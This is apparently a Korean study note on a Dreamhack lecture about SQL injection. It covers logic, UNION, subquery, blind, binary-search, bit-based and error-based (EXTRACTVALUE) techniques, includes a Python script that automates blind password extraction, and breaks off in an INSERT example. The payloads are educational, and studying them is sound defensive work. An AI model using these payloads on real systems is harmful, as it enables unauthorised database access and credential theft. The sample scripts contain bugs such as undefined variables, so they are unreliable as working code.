# Web Hacking: Server-side Advanced - SQL Injection
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - SQL Injection [🔗](https://dreamhack.io/lecture/courses/27)

<br/><br/>

## Overview: SQL Injection
📌 SQL Injection Basic [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Web%20Hacking%3A%20Server-side%20Basic.md#sql-injection) *← click!*
* SQL Injection: SQL 쿼리에 사용자의 입력값이 삽입되어 사용자가 원하는 쿼리를 실행할 수 있는 취약점
    - SQL을 사용하는 데이터베이스는 여러 종류가 있음 *→ DBMS의 종류에 따라 조금씩 다른 기법이 필요함*
    - SQL Injection 공격 수행을 위해선 RDBMS와 SQL에 대한 이해가 반드시 필요함

<br/><br/><br/>

## SQL Injection 공격 기법
* SQL Injection 취약점이 발생했을 때 데이터베이스 내에 존재하는 데이터를 획득하기 위한 다양한 공격 기법들이 존재함

<br/><br/>

### Logic
* Background: **논리 연산**
    - 대표적인 논리 연산자로는 ```and``` 연산과 ```or``` 연산이 있음
        | 논리 연산 | 설명 |
        |:---:|------|
        | **and 연산** | 모든 조건이 참인 경우에만 결과가 참이 됨 |
        | **or 연산** | 하나의 조건이라도 참이 되는 경우 결과는 참이 됨 |
    - 논리 연산(and, or) 예시
        | A | B | ```A && B``` <br/> (and 연산) | ```A \|\| B``` <br/> (or 연산) |
        |:---:|:---:|:---:|:---:|
        | 0 | 0 | 0 | 0 |
        | 1 | 0 | 0 | 1 |
        | 0 | 1 | 0 | 1 |
        | 1 | 1 | 1 | 1 |

<br/>

* **논리 연산**을 이용한 공격 방법 예시: 사용자에게 ```uid```, ```upw```를 입력 받아 uid를 조회하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin |
        | **upw** | admin |
        ```sql
        # uid가 'admin'이고, upw가 'admin'인 데이터를 조회하는 쿼리문이 생성됨
        SELECT uid FROM user_table WHERE uid='admin' AND upw='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin' or 1-- |
        | **upw** | 아무 압력이나 상관 없음 (주석 처리됨) |
        ```sql
        # or 연산을 사용하게 되어 모든 결과가 반환되게 됨 (주석 문자로 뒷부분 주석 처리)
        SELECT uid FROM user_table WHERE uid='admin' or '1' --AND upw='';
        ```
        + ⚠️ 해당 테이블에 존재하는 모든 데이터에 접근할 수 있음


<br/><br/>

### UNION
* Background: **UNION**
    - 다수의 SELECT 구문을 결합하는 절 *→ '합집합'을 의미함*
    - ⚠️ ```UNION``` 절을 통해 다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 다른 데이터를 조작할 수 있음
        + 애플리케이션이 **데이터베이스 쿼리의 실행 결과를 출력**할 경우 ```UNION``` 절이 공격에 유용하게 쓰일 수 있음
        + ```UNION```은 중복을 포함하지 않지만, ```UNION ALL```은 중복을 포함하여 모든 결과를 구함
    - **```UNION``` 절을 사용할 때는 2가지 필수 조건을 만족해야 함**
        | | 조건 |
        |:--:|------|
        | 1 | 이전 ```SELECT``` 구문과 ```UNION```을 사용하는 구문의 실행 결과 중 컬럼(열)의 갯수가 일치해야 함 |
        | 2 | 특정 DBMS에서는 이전 ```SELECT``` 구문과 ```UNION```을 사용한 구문의 컬럼(열)의 타입이 동일해야 함 |
        + 2가지 필수 조건 중 하나라도 만족하지 않으면 에러가 발생함

<br/>

* UNION 절을 이용한 공격 예시: 사용자에게 ```uid```, ```upw```를 입력 받아 uid를 조회하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin |
        | **upw** | admin |
        ```sql
        # uid가 'admin'이고, upw 'admin'인 데이터를 조회하는 쿼리문이 생성됨
        SELECT uid FROM user_table WHERE uid='admin' AND upw='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | ' UNION SELECT upw FROM user_table WHERE uid='admin' -- |
        | **upw** | 아무 압력이나 상관 없음 (주석 처리됨) |
        ```sql
        # UNION 절을 이용해 admin의 upw를 화면에 출력시킴
        SELECT uid FROM user_table WHERE uid='' UNION SELECT upw FROM user_table WHERE uid='admin' -- AND upw='';
        ```

<br/><br/>

### Subquery
* Background: **Subquery**
    - 한 쿼리 내에 또 다른 쿼리를 사용하는 것
        + 하나의 SQL문 안에 다른 SQL문이 중첩된(nested) 질의 → '부속질의'라고도 함
    - 주질의(main query, 외부질의)와 부속질의(subquery, 내부질의)로 구성됨
        + 📌 서브쿼리는 메인 쿼리 내에서 **소괄호 안에 구문을 삽입**해야 하며, ```SELECT``` 구문만 사용할 수 있음
    - 위치와 역할에 따른 서브쿼리의 분류
        + ```SELECT``` 절에서 사용되며 **단일 값**을 반환하는 **스칼라 부속질의**(scalar subquery)
            - 💡 ```SELECT``` 구문의 컬럼(COLUMNS) 절에서 서브 쿼리를 사용할 때에는 **단일 행**(Single Row)과 **단일 열**(Single Column)이 반환되도록 해야 함
                + 복수의 행과 열을 반환하는 서브 쿼리를 작성하면 실행 시 에러를 발생할 수 있음 <br/> &nbsp;&nbsp;&nbsp;&nbsp; ↳ *결과가 다중 행이거나 다중 열이라면 DBMS는 그 중 어떠한 행, 어떠한 열을 출력해야 하는지 알 수 없어 에러를 출력함*
                    - 예시
                        ```sql
                        # 복수 행을 반환함 (에러 발생; Subquery returns more than 1 row)
                        SELECT username, (SELECT 'ABCD' UNION SELECT 1234) FROM users;

                        # 복수 열을 반환함 (에러 발생: Operand should contain 1 column(s))
                        SELECT username, (SELECT "ABCD", 1234) FROM users;
                        ```
            - ```SELECT``` 구문과 ```UPDATE``` 구문에서 사용할 수 있음
        + ```FROM``` 절에서 결과를 **뷰**(View) 형태로 반환하는 **인라인 뷰**(Inline View, table subquery)
            - ```FROM``` 절에서 서브 쿼리를 사용하면 다중 행(Multiple Rows)과 다중 열(Multiple Columns) 결과를 반환할 수 있음
            - 뷰(View): 기존 테이블로부터 **일시적으로** 만들어진 가상의 테이블
                + ```AS```를 사용하여 뷰에 테이블 별칭을 명명할 수 있음
            - 인라인 뷰 예시
                ```sql
                # 생성한 인라인 뷰(user 테이블의 모든 열과 1234를 열으로 가지는 테이블)의 별칭을 u로 명명함
                SELECT * FROM (SELECT *, 1234 FROM users) AS u; 
                ```
        + ```WHERE``` 절에서 술어(predicate)와 같이 사용되며 결과를 한정시키기 위해 사용하는 **중첩질의**(nested subquery, predicate subquery)
            - ```WHERE```절에서 서브 쿼리를 사용하면 다중 행(Multiple Rows) 결과를 반환하는 쿼리문을 실행할 수 있음
            - 주질의의 자료 집합에서 한 행씩 가져와 부속질의를 수행함 <br/> &nbsp;&nbsp; → 연산 결과에 따라 ```WHERE``` 절의 조건이 참인지 거짓인지 확인하여 참이면 주질의의 해당 행을 출력함
            - 중첩질의 예시
                ```sql
                # users 테이블에서 username이 "admin", "guest"인 행을 검색함
                SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
                ```

<br/>

* Subquery를 이용한 공격 예시: 사용자에게 ```username```을 입력 받아 해당 username을 조회한 후 admin이면 true를, 아니면 false를 반환하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **username** | admin |
        ```sql
        # username이 'admin'인 항목의 username을 조회하는 쿼리문이 생성됨
        SELECT username FROM user_table WHERE username='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **username** | ' UNION SELECT IF(SUBSTR(upw, start, 1)='알파벳', 'admin', 'not admin') FROM user_table WHERE username='admin' -- |
        ```sql
        # SQL의 IF문을 사용해 비교 구문을 만들어 관리자 계정의 비밀번호를 한 글자씩 알아냄
        # start: 시작 위치, len: 길이(한 자리씩 비교하므로 1), '알파벳': 'a', 'b' 와 같이 해당 위치의 알파벳과 비교할 알파벳을 명시함
        #   ↳ 비교 결과 일치하면 'admin'을, 그렇지 않으면 'not admin'을 반환함 
        
        SELECT username FROM user_table WHERE username='' UNION SELECT IF(SUBSTR(upw, start, 1)='알파벳', 'admin', 'not admin') FROM user_table WHERE username='admin' -- AND userpw='';
        ```
        + Supplement
            - **SQL의 ```IF``` 조건문**: ```IF (조건문, 참일때 값, 거짓을 때 값)```
                ```sql
                SELECT IF(required, '필수', '선택') AS '필수 여부' FROM TABLE
                ```
            - **```SUBSTR``` 함수**: 문자열 중 특정 위치에서 시작하여 지정한 길이만큼 문자열을 반환하는 함수
                ```sql
                SUBSTR('문자열', 시작위치, 길이)
                ```

<br/><br/>

### Blind SQL Injection
* 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없을 때 사용될 수 있는 공격 기법
    - DBMS의 함수 또는 연산 과정 등을 이용해 데이터베이스 내에 존재하는 데이터와 이용자의 입력을 비교함 <br/> &nbsp;&nbsp; → 특정한 조건 발생 시 특별한 응답을 발생시켜 해당 비교에 대한 검증을 수행함
    - Blind SQL Injection을 수행하기 위해 만족해야 하는 조건
        | | 조건 |
        |:---:|------|
        | 1 | 데이터를 비교해 참/거짓을 구분함 |
        | 2 | 참/거짓의 결과에 따른 특별한 응답을 생성함 |
        + 데이터를 비교하여 참/거짓을 구분하는 구분으로 **If Statements**를 많이 사용함
            - DBMS별 IF Statement 사용 예시
                ```sql
                # MySQL: IF Statement (IF(조건식, 참일때 수행할 값, 거짓일 때 수행할 값)의 형태로 사용됨)
                SELECT IF(1=1, True, False);

                # SQLite: CASE expression (WHEN 다음의 식이 참이라면 THEN...ELSE 사이의 값를, 거짓이라면 ELSE...END 사이의 값을 출력함)
                SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

                # MSSQL: IF (IF 키워드 다음에 위치한 조건의 결과가 참이라면 SELECT 구문을 수행함)
                if (SELECT 'test') = 'test' SELECT 1234;
                ```
    - 📌 Blind SQL Injection의 단점 *→ 조금 더 효율적인 방법으로 Blind SQL Injection을 수행해야 함*
        + 수많은 쿼리를 전송하기 때문에 실제 환경에서는 방화벽에 의해 접속 IP가 차단될 수 있음
        + 데이터의 길이가 길면 길수록 실행해야 하는 쿼리의 수도 증가하고 공격에 들이는 시간이 길어짐

<br/>

* Blind SQL Injection: 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
    - 예시 코드와 데이터베이스
        ```python
        from flask import Flask, request # Flask 프레임워크 사용
        import pymysql # mysql을 DBMS로 사용함

        app = Flask(__name__)

        def getConnection():
            return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

        @app.route('/', methods=['GET'])
        def index():
            username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴

            # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
            sql = "select username from users where username='%s'" %username

            conn = getConnection()
            curs = con.cursor(pymysql.cursors.DictCursor)
            curs.execute(sql)
            rows = curs.fetchall()
            conn.close()

            # SQL 실행 결과가 아닌 True/False만을 출력함
            if (row[0]['username'] == 'admin'): # 데이터베이스의 결과인 username이 "admin"인 경우 이용자에게 "True"가 반환됨
                return "True"
            else: # 그렇지 않은 경우 "False"가 반환됨
                return "False"
        
        app.run(host='0.0.0.0', port=8000)
        ```
        | username | password |
        |:---:|------|
        | admin | Password_for_admin |
        | guest | guest_Password |
    - Blind SQL Injection 수행 가능 여부 확인: *```UNION``` 구문을 이용한 ```"admin"``` 반환*
        + ```index()``` 함수의 ```if...else``` 조건문 부분
            - 데이터베이스에서 반환된 결과가 ```"admin"```인 경우 이용자에게 ```"True"```가 반환됨
            - 데이터베이스에서 반환된 결과가 ```"admin"```이 아닌 경우 이용자에게 ```"False"```가 반환됨
    - Blind SQL Injection 공격 방법: **IF Statements** 및 비교 구문 추가
        + 이용자가 전달한 username 인자값
            ```
            /?username=' UNION SELECT IF(SUBSTR(password, 시작위치, 1)='비교할 알파벳', 'admin', 'not admin') FROM users WHERE username='admin'--
            ```
            - ```SUBSTR(string, position, length)``` 함수: 문자열(string)에서 지정한 위치(position)부터 길이(length)까지의 값을 반환하는 함수
                | SUBSTR 함수의 인자 | 설명 |
                |:---:|------|
                | string | Blind SQL Injection 공격을 통해 비밀번호를 획득하는 것이 목적 <br/> &nbsp;&nbsp; → users 데이터베이스의 **password** 부분의 데이터를 가져와 비교해야 함 |
                | position | password의 첫 번째부터 마지막 길이까지 하나씩 이동해가면서 쿼리를 전송해야 함 <br/> &nbsp;&nbsp; → ```position```의 값은 ```1 ~ (패스워드 길이)``` 범위의 정수값 |
                | length | 한 글자씩 password의 값을 알아내므로 ```length```의 값은 1로 고정됨 |
        - 예시: password의 첫 번째 문자를 알아내는 방법
            ```
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='A', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='B', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='C', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='D', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE

            ...

            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='P', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ TRUE
            ```
            + ***이와 같은 방법으로 position과 비교할 문자를 변경해가며 password 전체를 획득할 수 있음***

<br/>

* Blind SQL Injection 공격 자동화
    - 한 바이트씩 비교하여 공격하는 방식이므로 다른 공격에 비해 많은 시간을 들여야 하며 이용자가 직접 입력하기엔 물리적으로 한계가 발생할 수 있음 <br/> &nbsp;&nbsp; **→ 📌 공격을 자동화하는 스크립트를 작성하여 Blind SQL Injection 공격을 수행함**
        + 대중적으로 많이 사용되는 Python이나 웹 브라우저에 기본적으로 내장되어 있는 Javascript를 이용하는 등 다양한 언어와 라이브러리를 활용하여 효율적인 공격 스크립트를 작성할 수 있음
    - 파이썬의 ```requests``` 모듈을 이용한 스크립트 작성 방법
        + ⚠️ 공격 자동화 스크립트를 작성하기 전에 **이용자가 입력할 수 있는 모든 문자의 범위**를 지정해야 함
            - 비밀번호의 경우 일반적으로 알파벳 대소문자, 숫자, 그리고 특수문자로 이루어짐 → 아스키 범위 중에서 32부터 126까지를 지정하여 공격 스크립트를 작성함
        + Python을 이용한 공격 자동화 스크립트 예시
            ```python
            #!/usr/bin/python3

            import requests
            import string

            url = 'http://example.com/login' # 공격 URL
            password = '' # password를 저장할 변수
            
            # 비밀번호가 포함될 수 있는 문자를 string 모듈로 사용해 생성함
            tc = string.ascii_letters + string.digits + string.punctuation
            # tc → abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~

            # ⚠️ 길이를 먼저 구하고 길이만큼 반복문을 돌릴 수도 있음
            for index in range(1, 100):
                for ch in tc: # tc 대신에 range(32, 127)을 사용해도 무관함
                    payload= "/?username=' UNION SELECT IF(SUBSTR(password, %s, 1)=ORD(%s), 'admin', 'not admin') FROM users WHERE username='admin'--" %(index, ch)
                    addr = URL + payload

                    ret = requests.get(addr)
                    if c.text.find("True") != -1: # 데이터베이스에서 "admin"을 반환하면 출력되는 "True" 문자열을 찾음
                        password += chr(ch) # 해당 결과를 반환하는 문자를 password 변수에 추가함
                        break
            
            # admin의 전체 비밀번호를 출력함
            print(f"Password is {Password}")
            ```

<br/>

* Blind SQL Injection을 통해 데이터베이스의 내용을 효율적으로 알아내기 위한 방법
    - Binary Search (이진 탐색)
        + 이미 정렬된 리스트에서 검색 범위를 절반씩 좁혀가며 데이터를 탐색하는 방법 (효율적인 탐색을 위한 알고리즘)
            - 이진 탐색의 과정 → *찾으려는 데이터와 중간점에 위치하는 데이터를 반복적으로 비교해서 원하는 데이터를 찾음*
                | 과정 | 설명 |
                |---|------|
                | **1. 범위 지정** | 범위에서 한 숫자만이 정답일 때 범위의 **중간값**을 지정함 |
                | **2. 범위 조절** | 정답이 중간값보다 큰 값인지 확인함 <br/> &nbsp;&nbsp; → 큰 값이라면 범위를 ```(중간값 + 1) ~ (마지막 값)```으로 조절함 <br/> &nbsp;&nbsp; → 작은 값이라면 범위를 ```(첫 번째 값) ~ (중간값 - 1)```으로 조절함 |
                + ***1번과 2번 과정을 반복하다보면 범위를 크게 좁힐 수 있고, 최종적으로 정답을 찾아낼 수 있음***
        + Binary Search를 이용한 Blind SQL Injection 공격 예시
            - users 데이터베이스의 구성 (예시)
                | username | password |
                |:---:|------|
                | admin | P@ssword |
            - Binary Search를 이용한 공격 방법
                + 비밀번호에 포함될 수 있는 아스키에서 출력 가능한 문자의 범위(```32 ~ 126```)을 미리 확인하고 Binary Search를 통해 해당 범위를 좁혀가며 탐색을 진행함
                + 공격 코드 예시
                    ```sql
                    SELECT * FROM users WHERE username='admin' AND ASCII(SUBSTR(password, 1, 1)) > 79;
                    # P는 아스키 값으로 80이기 때문에 79보다 커 결과가 출력됨 → 큰 값이므로 다음 범위는 78 ~ 126이 됨
                    ```
                    - 아스키에서 출력 가능한 문자의 범위를 이진 탐색으로 좁혀가는 과정을 반복하다보면 비밀번호를 한 글자씩 알아낼 수 있음
    - Bit 연산을 이용하는 방법
        + 7개의 비트에 대해 1인지 비교하여 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아내는 방법
            - Bit 연산의 출발 배경
                + 하나의 비트는 0과 1로 이루어져 있으며, ASCII는 0 ~ 127 범위의 문자를 표현할 수 있음 <br/> &nbsp;&nbsp; → 7개의 비트를 통해 하나의 문자를 나타낼 수 있음을 의미함
            - MySQL의 ```BIN``` 험수와 ```ORD``` 함수
                | 함수 | 형태 | 설명 |
                |:---:|:---:|------|
                | **BIN** | ```BIN(숫자)``` | 인자로 입력된 숫자를 2진수로 반환함 |
                | **ORD** | ```ORD(문자)``` | ```'A'```와 같이 인자로 입력된 문자의 아스키 코드 값을 반환함 |
                + 사용 예시
                    ```sql
                    SELECT BIN(ORD('A')); # 'A'(문자)를 아스키 코드 값(숫자) 형태로 변환하고, 이를 다시 비트의 형태로 반환함
                    ```
        + Bit 연산을 이용한 Blind SQL Injection 공격 예시
            - users 데이터베이스의 구성 (예시)
                | username | password |
                |:---:|------|
                | admin | P@ssword |
            - Bit 연산을 이용한 공격 방법
                + ```SUBSTR```과 ```BIN```을 이용해서 총 7번의 쿼리를 실행해 바이트씩 알아낼 수 있음 → 이를 비밀번호의 길이만큼 반복하여 전체 비밀번호를 알아낼 수 있음
                + 공격 코드 예시: password의 첫 번째 문자
                    ```sql
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 1, 1)=1; # 결과가 출력됨 (첫번째 자리 1)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 2, 1)=1; # 결과가 출력되지 않음 (두번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 3, 1)=1; # 결과가 출력됨 (세번째 자리 1)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 4, 1)=1; # 결과가 출력되지 않음 (네번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 5, 1)=1; # 결과가 출력되지 않음 (다섯번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 6, 1)=1; # 결과가 출력되지 않음 (여섯번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 7, 1)=1; # 결과가 출력되지 않음 (일곱번째 자리 0)
                    # 비밀번호의 첫 번째 바이트: 1010000 → 10진수로 표현하면 80 (문자로 표현하면 'P')
                    ```

<br/><br/>

### Error based
* 임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법
    - 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우에 사용할 수 있는 공격 형태 *→ 공격 성공 여부를 에러를 통해 알 수 있음*
        + ⚠️ 애플리케이션에서 발생하는 에러를 이용해 공격하려고 한다면 **런타임 에러**가 필요함
            - 런타임 에러(Runtime Error): 퀴리가 실행되고 나서 실행하는 에러
        + 문법 에러(Syntax Error)와 같이 **DBMS에서 쿼리가 실행되기 전에 발생하는 에러는 불가능함**
    - 공격자는 오류(에러) 메시지를 통해 공격에 필요한 다양한 정보를 수집하고 원하는 데이터를 획득할 수 있음
        + ***에러 메시지와 같이 쿼리 실행 결과를 직접 노출하지는 않지만, 중요한 정보를 노출하는 방법들이 존재함***

<br/>

* Error based SQL Injection 예시: 사용자에게 ```username```을 입력 받아 해당 username을 조회한 후 admin이면 true를, 아니면 false를 반환하는 경우
    ```python
    from flask import Flask, request # Flask 프레임워크 사용
    import pymysql

    app = Flask(__name__)

    def getConnection():
        return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

    @app.route('/'. methods=['GET'])
    def index():
        username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴

        # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
        sql = "SELECT username FROM users WHERE username='%s'" %username

        conn = getConnection()
        curs = conn.cursor(pymysql.cursors.DictCursor)
        curs.execute(sql)
        rows = curs.fetchall()
        conn.close()

        # SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과(True/False)만 판단함
        if (rows):
            return "True"
        else:
            return "False"
    
    app.run(host='0.0.0.0', port=8000, debug=True) # 디버그 모드 활성화(debug=True)
    ```
    - Error based SQL Injection 공격 방법
        + Flask 프레임워크로 개발한 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생했을 때 발생 원인을 출력함
        + 에러 발생 예시: username에 ```admin 1'```을 입력하면 문법 에러(Syntax Error)가 발생함
            ```sql
            # 파이썬 코드 내 index 함수의 두 번째 실행문에서 생성되는 쿼리
            SELECT username FROM users WHERE username='admin 1''
            ```
    - Error based SQL Injection 공격 코드
        + Background: **```EXTRACTVALUE``` 함수**
            - 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출하는 함수
            - 두 번째 인자 값에 따른 함수 실행 결과
                + 올바른 XPATH 식을 전달한 경우 쿼리가 정상적으로 실행됨
                    ```sql
                    SELECT EXTRACTVALUE('<a>test</a><b>abcd</b>', '/a'); # 결과: test
                    ```
                + 올바르지 않은 XPATH 식을 전달한 경우 **에러 메시지에 삽입된 식의 결과가 출력됨** <br/> &nbsp;&nbsp; ***→ ⚠️ 올바르지 않은 XPATH 식에 중요한 정보를 추출할 수 있는 식을 입력한다면 공격자는 중요 정보를 획득할 수 있음***
                    ```sql
                    SELECT EXTRACTVALUE(1, ":abcd"); # 결과: ERROR 1105 (HY000): XPATH syntax error: ':abcd'
                    ```
        + MySQL 환경에서 Error based SQL Injection으로 공격할 때 많이 사용하는 쿼리와 실행 결과
            ```sql
            SELECT EXTRACTVALUE(1, CONCAT(0x3a, version()));
            # 결과: ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
            ```
            - XPATH 식에 삽입된 ```version()``` 함수가 실행되면서 에러 메시지에 운영체제에 대한 정보가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 이 정보를 이용해 1-day 또는 0-day 공격을 통해 서버를 장악할 수 있음
            - ```CONCAT(str1, str2[, str3, ...])``` 함수: 둘 이상의 문자열을 입력한 순서대로 합쳐서 반환해주는 함수
        + ```EXTRACTVALUE``` 함수와 서브쿼리를 이용하여 데이터베이스의 정보를 추출하는 쿼리와 실행 결과
            ```sql
            SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='admin')));
            # 결과; ERROR 1105 (HY000): XPATH syntax error: ':This_is_admin_PASSW@rd'
            ```
            - XPATH 식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 users 테이블의 admin의 비밀번호가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 서브 쿼리를 이용해 임의 테이블의 데이터를 획득할 수 있음

<br/>

* DBMS별로 Error based SQL Injection을 위해 사용하는 주요 쿼리문

<br/><br/><br/>

## SQL DML 구문에 대한 이해
* **SQL DML**(Data Manipulation Langauge, 데이터 조작어)
    - 데이터베이스의 테이블에서 **데이터를 조회**하거나, **추가/삭제/수정을 수행**하는 구문
    - 일반적인 이용자가 입력하는 데이터는 **대부분 DML를 통해 처리**하게 됨 <br/> &nbsp;&nbsp; *→ ⚠️ 각 쿼리가 사용되어지는 목적과 형태를 이해하게 되면 SQL Injection 공격을 더 잘 이해할 수 있음*

<br/><br/>

### SELECT: 데이터를 조회하는 구문
* MySQL 8.0 Reference Manual의 ```SELECT Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/select.html)
    ```sql
    SELECT
        [ALL | DISTINCT | DISTINCTROW ]
        select_expr [, select_expr]
        [FROM table_references
        [PARTITION partition_list]]
        [WHERE where_condition]
        [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
        [HAVING where_condition]
        [WINDOW window_name AS (window_spec)
            [, window_name AS (window_spec)] ...]
        [ORDER BY {col_name | expr | position}
        [ASC | DESC], ... [WITH ROLLUP]]
        [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    ```
    - 데이터를 검색하는 기본 문장 → **질의어**(query)라고 부름
    - SELECT 구문의 간단한 형식: ```SELECT 열1[, 얄2, ...] FROM 테이블 이름 [WHERE <검색조건>] [GROUP BY 속성이름] [ORDER BY 속성이름 [ASC | DESC]];```
        | 절 | 설명 |
        |:---:|------|
        | SELECT | 해당 문자열을 시작으로, 조회하기 위한 표현식과 컬럼들에 대해 정의함 <br/> &nbsp;&nbsp; - 열의 순서는 결과 테이블의 열 순서를 결정하며, 기본적으로 중복을 제거하지 않음 <br/> &nbsp;&nbsp; - ```SELECT *```은 테이블의 모든 열을 조회한다는 의미 |
        | FROM | 데이터를 조회할 테이블의 이름 |
        | WHERE | 조회할 데이터의 조건 <br/> &nbsp;&nbsp; - 조건으로 사용할 수 있는 **술어**(predicate)가 존재하며, 복합조건 사용 시 **논리 연산자 ```AND```, ```OR```, ```NOT```**을 사용함 |
        | ORDER BY | 조회한 결과를 원하는 컬럼 기준으로 정렬함 <br/> &nbsp;&nbsp; - 정렬을 원하는 열 이름을 순서대로 지정하며, 기본은 오름차순(ASC) 정렬임 |
        | LIMIT | 조회한 결과에서 행의 갯수와 오프셋을 지정함 |
        + WHERE절에서 조건으로 사용할 수 있는 술어(predicate)
            | 술어 | 설명 |
            |:---:|------|
            | 비교 | ```=```, ```<>```, ```<```, ```<=```, ```>```, ```>=``` 등을 사용함 |
            | 범위 | ```BETWEEN``` 연산자를 사용하면 값의 범위를 지정할 수 있음 (논리 연산자 ```AND```을 함께 사용함) <br/> &nbsp;&nbsp; - ex: 가격이 10000 이상 20000 이하인 경우 → ```WHERE price BETWEEN 10000 AND 20000``` |
            | 집합 | 두 개 이상의 값을 비교하기 위해 ```IN```, ```NOT IN``` 연산자를 이용함 |
            | 패텬 | 문자열의 패턴 비교를 위해 ```LIKE``` 연산자와 와일드카드 문자를 사용함 |
            | NULL |
            | 복합조건 | 논리 연산자 ```AND```, ```OR```, ```NOT```을 사용하면 복합 조건을 명시할 수 있음 |
    - ⚠️ SELECT 구문에서 이용자의 입력 데이터가 주로 사용되는 ```WHERE```, ```ORDER BY```, ```LIMIT``` 절에서 SQL Injection이 발생할 수 있음

<br/>

* SELECT 구문 사용 예시
    ```sql
    SELECT uid, title, boardcontent # uid, title, boardcontent 열을 조회 (결과 테이블의 열 순서도 이와 동일함)
    FROM boards # board 테이블에서
    WHERE boardcontent LIKE '%abc%' # 조건(패턴 비교): abc를 포함하는 문자열
    ORDER BY uid DESC # 정렬: uid를 기준으로 내림차순(DESC) 정렬
    LIMIT 5; # 결과 테이블의 행의 수: 5
    ```

<br/><br/>

### INSERT: 데이터를 추가하는 구문
* MySQL 8.0 Reference Manual의 ```INSERT Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/insert.html)
    ```SQL
    INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
        [INTO] tbl_name
        [PARTITION (partition_name [, partition_name] ...)]
        [(col_name [, col_name] ...)]
        { {VALUES | VALUE} (value_list) [, (value_list)] ... }
        [AS row_alias[(col_alias [, col_alias] ...)]]
        [ON DUPLICATE KEY UPDATE assignment_list]
    ```
    - INSERT 구문의 간단한 형식: ```INSERT INTO 테이블이름 [(속성리스트)] VALUES (값 리스트);```
        | 절 | 설명 |
        |:---:|------|
        | INSERT | 해당 문자열을 시작으로, 추가할 테이블과 데이터를 정의함 |
        | INTO | 데이터를 추가할 테이블의 이름과 컬럼을 정의함 (새로운 행을 삽입할 때에는 속성의 이름을 생략할 수 있음) <br/> &nbsp;&nbsp; ***→ 데이터의 입력 순서는 속성의 순서와 일치해야 함*** |
        | VALUES | INTO 절에서 정의한 테이블의 컬럼에 추가할 데이터의 값을 명시함 |
    - ⚠️ INSERT 구문에서는 추가할 데이터의 값들이 입력되는 ```VALUE[S]``` 절에서 주로 SQL Injection이 발생함

<br/>

* INSERT 구문 사용 예시
    ```sql
    # 예시 1: 쿼리 한 줄로 두 개 이상의 데이터를 추가함 → ,를 이용해 여러 데이터를 한 번에 추가하고 있음
    INSERT
        INTO boards (title, boardcontent)
